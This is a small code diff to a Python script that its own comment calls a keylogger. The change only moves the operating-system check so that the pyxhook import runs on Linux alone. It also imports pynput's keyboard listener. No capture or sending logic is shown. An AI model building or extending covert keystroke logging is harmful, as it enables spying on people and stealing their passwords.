@@ -1,11 +1,12 @@
 import platform
 import sys
-import pyxhook
+mySystem = platform.system()
+if mySystem == 'Linux':
+    import pyxhook
 
 from pynput.keyboard import Key, Listener
 import logging
 
-mySystem = platform.system()
 #execute windows keylogger
 if mySystem == 'Windows':
     print("Windows")
